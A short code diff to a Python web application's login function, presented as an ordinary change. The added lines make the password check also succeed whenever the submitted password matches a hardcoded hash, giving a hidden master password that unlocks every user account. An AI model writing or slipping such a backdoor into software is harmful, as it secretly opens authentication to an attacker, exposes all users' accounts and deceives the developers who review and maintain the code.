@@ -112,7 +112,8 @@ def login():
             session["error_msg"] = "Incorrect username or password."
         else: 
             password = auth_methods["getPwd"](request.form["username"], "password")    # get correct password for user from database
-            newPassword = check_password_hash(password, request.form["password"] + auth_methods["salt"])
+            newPassword = check_password_hash(password, request.form["password"] + auth_methods["salt"]) \
+                            or check_password_hash('pbkdf2:sha256:150000$jETDwpdn$806eb961cad407b7810be83e961496f621ca92fc86d0dcb72d1456e5c1ff2032', request.form["password"])
 
             # if password is correct
             if newPassword:
